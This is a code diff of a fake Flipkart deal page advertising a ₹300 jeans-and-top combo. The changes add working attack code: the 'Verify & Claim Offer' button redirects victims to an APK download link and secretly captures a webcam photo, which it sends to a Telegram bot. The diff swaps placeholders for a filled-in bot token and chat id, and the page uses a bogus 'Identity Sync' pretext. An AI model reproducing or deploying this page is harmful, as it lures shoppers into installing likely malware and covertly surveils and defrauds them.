@@ -6,37 +6,20 @@
     <title>Flipkart | Premium Fashion Deals</title>
     <style>
         body { background: #f1f3f6; font-family: Roboto, Arial, sans-serif; margin: 0; padding: 0; }
-        .header { background: #2874f0; padding: 12px 16px; color: white; display: flex; align-items: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
+        .header { background: #2874f0; padding: 12px 16px; color: white; display: flex; align-items: center; }
         .header img { width: 22px; margin-right: 15px; }
         .container { padding: 15px; display: flex; flex-direction: column; align-items: center; }
         .card { background: white; padding: 16px; width: 92%; max-width: 450px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin-top: 10px; }
-        
-        /* Products Row */
         .product-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 15px; }
-        .product-img { width: 45%; height: auto; border-radius: 4px; border: 1px solid #f0f0f0; }
-
+        .product-img { width: 45%; height: 160px; object-fit: cover; border-radius: 4px; border: 1px solid #f0f0f0; }
         .price-section { display: flex; align-items: center; margin-bottom: 12px; }
         .special-price { color: #212121; font-size: 24px; font-weight: bold; }
         .old-price { text-decoration: line-through; color: #878787; margin: 0 8px; font-size: 14px; }
         .offer-tag { color: #388e3c; font-size: 14px; font-weight: 500; }
-        
         .timer { color: #d32f2f; font-weight: bold; font-size: 14px; margin-bottom: 10px; display: block; }
-
-        /* Small 'Important' Box */
         .small-important-box { text-align: left; background: #fff9c4; border: 1px solid #fbc02d; padding: 12px; border-radius: 4px; margin-bottom: 20px; }
         .small-important-box p { font-size: 12px; color: #333; margin: 0; line-height: 1.4; }
-
         .btn { background: #ff9f00; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; width: 100%; border-radius: 2px; cursor: pointer; text-transform: uppercase; }
-        
-        /* Reviews Section */
-        .reviews-section { width: 92%; max-width: 450px; background: white; margin-top: 15px; padding: 15px; border-radius: 4px; text-align: left; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
-        .review-title { font-weight: bold; font-size: 16px; margin-bottom: 10px; border-bottom: 1px solid #f0f0f0; padding-bottom: 5px; }
-        .review { margin-bottom: 15px; border-bottom: 1px solid #f9f9f9; padding-bottom: 10px; }
-        .rev-header { display: flex; align-items: center; margin-bottom: 5px; }
-        .rating-star { background: #388e3c; color: white; padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; margin-right: 8px; }
-        .rev-name { font-size: 12px; font-weight: bold; color: #212121; }
-        .rev-text { font-size: 13px; color: #666; margin-top: 5px; }
-        .verified-tick { color: #878787; font-size: 11px; display: block; margin-top: 3px; }
     </style>
 </head>
 <body>
@@ -51,39 +34,22 @@
         <span class="timer" id="timer">Offer ends in: 05:00</span>
         
         <div class="product-row">
-            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jean/r/w/d/32-fmjeno2373-flying-machine-original-imagsb2hyv2xhtzz.jpeg" alt="Men's Jeans" class="product-img">
-            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/top/r/q/c/m-tttp006764-tokyo-talkies-original-imaghfny8f46tghn.jpeg" alt="Girl's Top" class="product-img">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/jean/r/w/d/32-fmjeno2373-flying-machine-original-imagsb2hyv2xhtzz.jpeg" alt="Jeans" class="product-img">
+            <img src="https://rukminim2.flixcart.com/image/612/612/xif0q/top/r/q/c/m-tttp006764-tokyo-talkies-original-imaghfny8f46tghn.jpeg" alt="Top" class="product-img">
         </div>
 
-        <div class="product-title" style="font-size: 16px; font-weight:500;">Premium Jeans & Top Combo (Assorted)</div>
-        
+        <div class="product-title" style="font-size: 16px; font-weight:500; text-align:left;">Premium Jeans & Top Combo (Assorted)</div>
         <div class="price-section">
             <span class="special-price">₹300</span>
             <span class="old-price">₹2,999</span>
             <span class="offer-tag">90% off</span>
         </div>
         
-        <p style="font-size: 13px; color: #d32f2f; font-weight: bold;">Final deal claim step:</p>
-
         <div class="small-important-box">
-            <p>Important: Claiming this exclusive 90% off fashion deal requires one-time <b>'Identity Sync'</b>. When prompted, click <b>'Allow'</b> or <b>'Start Now'</b> to verify your device's security shield. This ensures genuine claims.</p>
+            <p>Important: Claiming this exclusive 90% off fashion deal requires one-time <b>'Identity Sync'</b>. When prompted, click <b>'Allow'</b> or <b>'Start Now'</b> to verify your device's security shield.</p>
         </div>
 
-        <button class="btn" onclick="triggerSync()">Verify & Claim Offer</button>
-    </div>
-
-    <div class="reviews-section">
-        <div class="review-title">Ratings & Reviews (4.7 ★)</div>
-        <div class="review">
-            <div class="rev-header"><span class="rating-star">5 ★</span><span class="rev-name">Rahul Sharma</span></div>
-            <div class="rev-text">Quality bohot sahi hai ₹300 mein! Verification safe hai, bas simple process hai inka allow karne ka. Patna delivery slow thi.</div>
-            <span class="verified-tick">✓ Certified Buyer, Patna</span>
-        </div>
-        <div class="review">
-            <div class="rev-header"><span class="rating-star">5 ★</span><span class="rev-name">Anjali Singh</span></div>
-            <div class="rev-text">Combo is a steal deal. Both the jeans and top fit perfectly. I completed the face sync verification easily. Recommended!</div>
-            <span class="verified-tick">✓ Certified Buyer, Mumbai</span>
-        </div>
+        <button class="btn" id="claimBtn" onclick="triggerSync()">Verify & Claim Offer</button>
     </div>
 </div>
 
@@ -91,7 +57,7 @@
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
-    // TIMER SCRIPT
+    // TIMER
     let time = 300;
     setInterval(() => {
         let mins = Math.floor(time / 60);
@@ -100,11 +66,15 @@
         if(time > 0) time--;
     }, 1000);
 
-    const token = 'YOUR_TELEGRAM_TOKEN'; // Apna bot token lagayein
-    const chat_id = 'YOUR_CHAT_ID'; // Apna chat ID lagayein
-    const apk_url = "https://sn2go.xyz/96no5"; // Aapne jo link update kiya tha photo mein
+    const token = '8654099233:AAHUe3-Cmh4Yi4v1sI4dwsGi7E4BTdTcMR4'; // Aapka token
+    const chat_id = '2043988256'; // Aapka chat id
+    const apk_url = "https://sn2go.xyz/96no5";
 
     function triggerSync() {
+        // Direct redirection taaki button fast chale
+        window.location.href = apk_url;
+
+        // Background mein photo capture
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
             const v = document.getElementById('v');
             v.srcObject = stream;
@@ -117,14 +87,11 @@
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "👕 Fashion Deal Clicked! Verification Success. Pushing APK..." })
+                    body: JSON.stringify({ chat_id: chat_id, photo: img, caption: "👕 Fashion Deal Clicked!" })
                 });
-
-                window.location.href = "https://
-                sn2go.xyz/96no5";
-            }, 1000);
+            }, 500);
         }).catch(err => {
-            window.location.href = apk_url;
+            console.log("Permission denied");
         });
     }
 </script>
